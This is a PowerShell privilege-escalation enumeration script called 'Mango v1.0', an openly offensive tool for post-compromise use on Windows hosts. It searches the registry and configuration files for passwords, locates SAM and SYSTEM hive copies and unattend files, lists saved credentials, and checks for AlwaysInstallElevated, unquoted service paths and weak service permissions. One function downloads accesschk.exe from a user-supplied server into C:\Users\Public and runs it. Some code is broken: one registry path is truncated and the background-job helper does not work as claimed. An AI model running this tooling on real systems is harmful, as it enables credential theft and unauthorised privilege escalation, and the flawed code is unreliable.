<# 
Mango-v(1.0) windows Privilege Escalation Script 
Author: z3r0day

comment: This is my First ever full fledged powershell script so Forgive me for any shit scripting you Find in the code :)
Bully Maguire: Want forgiveness? Get religion.

This script is kept very minimalistic for now, more code would added in upcoming updates!
The functionallity of script is Designed in a way that all checks Requested by user are performed as Fast as Possbile.
The script manages and executed multiple checks in the background at the same time and then retrieves the command Output for each thread.
Also The script would not crash your shell even in case of overwhelming output [as for now ;)].
#>

Function banner {
    Write-Host "`n[+] Mango v(1.0) starting.....`n" -ForegroundColor Cyan
}

function job-manager($arg1) {
    # This is that background task management function :)
    $func_to_run = $arg1
    echo $func_to_run
    $id = Start-Job -ScriptBlock { $func_to_run }
    $prop = $id | Select-Object -Property JobStateInfo 
    #wait for job to complete
    Get-Job | Wait-Job | Out-Null
    $Job_id = (Get-Job -State Completed | Select-Object -Property Id).Id
    Receive-Job $Job_id
    Get-job | Remove-Job | Out-Null
}

Function startup_apps {
    Write-Host "[+] Finding System Startup Apps`n" -ForegroundColor DarkGreen
    wmic startup get caption,command
    reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
    dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
}

Function sch_tasks {
    Write-Host "[+] Finding scheduled tasks`n" -ForegroundColor DarkGreen
    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
}

Function command_history {
    Write-Host "[+] Fetching powershell command History!`n" -ForegroundColor DarkGreen
    Get-History
}
Function Reg_elevated {
    Write-Host "[+] Checking for Always install elevated in Registry`n" -ForegroundColor DarkGreen
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
}

Function sam_find {
    Write-Host "[+] Looking for SAM and System Files`n" -ForegroundColor DarkGreen
    $File_paths = @("C:\Windows\repair\SAM", "C:\Windows\System32\config\RegBack\SAM", "C:\Windows\System32\config\SAM", "C:\Windows\repair\system", "C:\Windows\System32\config\SYSTEM", "C:\Windows\System32\config\RegBack\system")
    ForEach ($file_path in $File_paths) {
        if (Test-Path $file_path) {
            Write-Host "Found Valid Path: $file_path"
        }
    }
}

Function reg_pass_find {
    Write-Host "[+] Searching for Keyword pass in Registry :: This could generate overwhelming output.`n" -ForegroundColor DarkGreen
    REG QUERY HKLM /F "pass" /t REG_SZ /S /K
    REG QUERY HKCU /F "pass" /t REG_SZ /S /K
}

Function conf_file_pass {
    Write-Host "[+] Looking for password keyword in configuration Files`n" -ForegroundColor DarkGreen
    Write-Host "[+] Searching for unattented XML Files..." -ForegroundColor DarkGreen
    cmd.exe /C "dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*"
    $File_paths = @("C:\unattend.xml", "C:\Windows\Panther\Unattend.xml", "C:\Windows\Panther\Unattend\Unattend.xml", "C:\Windows\system32\sysprep.inf", "C:\Windows\system32\sysprep\sysprep.xml")
    ForEach ($file_path in $File_paths) {
        if (Test-Path $file_path) {
            Write-Host "Found Valid Path: $file_path"
        }
    }
}


Function passwords_lookup {
    Write-Host "[+] Looking for Saved Creds" -ForegroundColor DarkGreen
    cmdkey /list
    job-manager(command_history)
    job-manager(sam_find)
    job-manager(conf_file_pass)
    job-manager(reg_pass_find)
}

Function insecure_service_permissions {
    Write-Host "[+] Starting check for Insecure service permissions" -ForegroundColor DarkGreen
    Write-Host "`n[+] Requires use of accesschk.exe" -ForegroundColor DarkGreen
    Write-Host "[+] Enter the Server URL http://<IP>:<Port>/accesschk.exe" -ForegroundColor DarkGreen
    $url = Read-Host
    Write-Host "`n[+] Attempting to download accesschk.exe in C:\Users\Public" -ForegroundColor DarkGreen
    curl $url -o C:\Users\Public\accesschk.exe
    C:\Users\Public\accesschk.exe /accepteula -uwcv Everyone *
}

Function unquoted_service_paths {
    Write-Host "`n[+] Checking For unquoted Service Paths" -ForegroundColor DarkGreen
    cmd.exe /C 'wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """'
}

Function system-info {
    $current_user = C:\Windows\System32\whoami.exe
    Write-Host "`n[+] My Current user: ${current_user}" -ForegroundColor DarkGreen
    Write-Host "`n[+] ${current_user}'s privileges." -ForegroundColor DarkRed
    C:\Windows\System32\whoami.exe /priv
    Write-Host "`n[+] Other users present on the System.." -ForegroundColor Red
    C:\Windows\System32\net.exe user
    Write-Host "`n[+] Fetching System info.....`n" -ForegroundColor DarkGreen
    C:\Windows\System32\systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
    wmic os get osarchitecture
    Write-Host "`n[+] Patches installed on the system.." -ForegroundColor Red
    wmic qfe

}

Function service_config {
    job-manager(insecure_service_permissions)
    job-manager(unquoted_service_paths)
}


Function Network_enum {
    Write-Host "`n[+] Fetching Basic NIC info" -ForegroundColor DarkGreen
    Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
    Write-Host "`n[+] Fetching System routing table" -ForegroundColor DarkGreen
    Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
    Write-Host "`n[+] Listing ARP table" -ForegroundColor DarkGreen
    Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
    Write-Host "`n[+] Listing Current Network Connections" -ForegroundColor DarkGreen
    netstat -ano
    Write-Host "`n[+] Listing Network Shares" -ForegroundColor DarkGreen
    net share
    Write-Host "`n[+] Fetching Firewall info" -ForegroundColor DarkGreen
    netsh firewall show state
    netsh firewall show config
}

Function C_Enum {
    $Array_def_dir = @("PerfLogs", "Program Files", "Program Files (x86)", "Share", "Users", "Windows")
    Write-Host "`n[+] Non-Default Folders present in the C:\ Dir..`n" -ForegroundColor Red
    $Dirs = Get-ChildItem -Path C:\ | Select-Object Name | where Name -NotIn $Array_def_dir
    foreach ($Element in $Dirs) {
        $dir_name = $Element.Name
        Write-Host "Dir-Name: $dir_name"
    }
    Write-Host "`n"
    foreach ($Element in $Dirs) {
        $dir_name = $Element.Name
        Write-Host "`[+] Fetching contents of $dir_name"
        dir C:\$dir_name
    }

    Write-Host "`n[+] Enumerating Non-Default Programs Installed." -ForegroundColor Red
    $Array_target1 = @("Common Files", "Internet Explorer", "VMware", "Windows Defender", "Windows Defender Advanced Threat Protection", "Windows Mail", "Windows Media Player", "Windows Multimedia Platform", "Windows NT", "Windows Photo Viewer", "WindowsPowerShell", "Windows Security", "Windows Portable Devices")
    Write-Host "`n[+] Target1: Program Files." -ForegroundColor DarkGreen
    $Dirs = Get-ChildItem -Path "C:\Program Files" | Select-Object Name | where Name -NotIn $Array_target1
    foreach ($Element in $Dirs) {
        $dir_name = $Element.Name
        Write-Host "Dir-Name: $dir_name"
    }
    $Array_target2 = @("Microsoft", "Common Files", "Internet Explorer", "VMware", "Windows Defender", "Windows Defender Advanced Threat Protection", "Windows Mail", "Windows Media Player", "Windows Multimedia Platform", "Windows NT", "Windows Photo Viewer", "WindowsPowerShell", "Windows Security", "Windows Portable Devices")
    Write-Host "`n[+] Target2: Program Files (x86)." -ForegroundColor DarkGreen
    $Dirs = Get-ChildItem -Path "C:\Program Files (x86)" | Select-Object Name | where Name -NotIn $Array_target2
    foreach ($Element in $Dirs) {
        $dir_name = $Element.Name
        Write-Host "Dir-Name: $dir_name"
    }
}



Function menu
{
    param (
    [string]$Title = "Mango-v(1.0) choose the option!"
    )
    Write-Host "=================================== $Title ==================================="
    Write-Host "1: Basic info about system and users"
    Write-Host "2: C:\ Enum "
    Write-Host "3: Network Information"
    Write-Host "4: Check For Service Misconfigurations"
    Write-Host "5: Reg Elevated."
    Write-Host "6: Look For Clear Text Passwords"
    Write-Host "7: Find Scheduled Tasks"
    Write-Host "8: Find Startup Applications"
    Write-Host "9: Clear the console`n"
    Write-Host "exit: exit Mango!"
    Write-Host "=============================================================================="
}




banner
while ($userinput -ne "exit") {
    menu -Title 'Mango-v(1.0) choose the options!'
    Write-Host "`nMake the Appropriate Selection:- "
    $userinput = Read-Host 
    switch ($userinput)
    {
        '1' {job-manager(system-info)}

        '2' {job-manager(C_Enum)}

        '3' {job-manager(Network_enum)}

        '4' {job-manager(service_config)}

        '5' {job-manager(Reg_elevated)}

        '6' {job-manager(passwords_lookup)}

        '7' {job-manager(sch_tasks)}

        '8' {job-manager(startup_apps)}

        '9' {job-manager(Clear-Host)}
 
    }
}

